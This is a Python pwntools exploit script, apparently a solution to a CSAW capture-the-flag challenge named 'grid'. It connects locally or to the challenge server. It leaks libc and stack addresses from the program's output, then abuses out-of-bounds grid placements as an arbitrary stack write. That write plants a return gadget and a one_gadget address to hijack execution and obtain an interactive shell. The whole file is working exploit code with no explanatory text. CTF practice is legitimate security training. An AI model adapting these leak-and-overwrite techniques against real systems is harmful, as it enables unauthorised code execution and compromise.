from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './grid'
HOST = 'pwn.chal.csaw.io'
PORT = 5013

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def disp():
    r.sendlineafter('shape> ', 'd')

def place(c, x, y):
    r.sendlineafter('shape> ', c)
    r.sendlineafter('loc> ', str(x))
    r.sendline(str(y))

r = start()
if args.D:
    debug(r, [0x0d8e])
disp()
r.recv(0x25)
leak = u64(r.recv(6)+'\x00'*2)
dbg('leak')
base = leak - 0x4ec5da
dbg('base')
one = base + 0x10a45c
ret = 0x004008ae

r.recv(0x45)
hw = r.recv(4)
lw = r.recv(4)
leak = u64(lw+hw)
dbg('leak')
stack = leak + 0x70
dbg('stack')

def aaw_to_stack(offset, payload):
    assert(len(payload)==8)
    for i in range(8):
        place(payload[i], -236, i+offset)

aaw_to_stack(0, p64(ret))
aaw_to_stack(8, p64(one))

disp()
for i in range(98-16):
    place('A', 0, 0)

r.interactive()
r.close()
